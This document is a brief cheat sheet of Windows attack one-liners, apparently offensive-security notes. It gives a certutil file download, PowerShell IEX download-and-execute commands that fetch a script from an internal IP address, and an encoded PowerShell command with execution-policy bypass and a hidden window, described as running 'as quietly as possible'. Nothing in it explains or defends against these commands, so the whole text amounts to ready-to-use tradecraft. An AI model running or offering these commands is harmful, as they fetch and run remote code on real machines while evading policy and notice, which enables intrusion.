# DOS commands

## download file from http
```
certutil.exe -urlcache -split -f "https://download.sysinternals.com/files/PSTools.zip" pstools.zip
```

# powershell commands

## download and execute script
```
powershell -c "IEX(New-Object Net.WebClient).downloadString('http://192.168.69.69/script.ps1')"
IEX(New-Object Net.WebClient).downloadString('http://192.168.69.69/script.ps1')
```

## encoded command nop bypass hidden
## execute encoded command as quietly as possible
```
powershell.exe -nop -exec bypass -w hidden -enc BASE64STR
```
